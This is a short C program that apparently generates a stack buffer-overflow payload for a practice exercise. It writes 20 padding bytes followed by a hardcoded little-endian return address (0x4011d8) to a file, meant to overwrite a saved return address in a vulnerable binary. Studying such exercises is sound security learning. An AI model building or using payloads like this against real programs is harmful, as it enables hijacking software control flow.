#include <stdio.h>

int
main ()
{
  unsigned char fill[28]; // 12+8(64)+8
  for (int i = 0; i < 20; i++)
    {
      fill[i] = 'A';
    }

  unsigned long addr = 0x4011d8;
  for (int i = 0; i < 8; i++)
    {
      fill[20 + i] = (addr >> (i * 8)) & 0xFF;
    }
  FILE *f = fopen ("fill.txt", "wb");
  fwrite (fill, 1, sizeof (fill), f);
  fclose (f);

  return 0;
}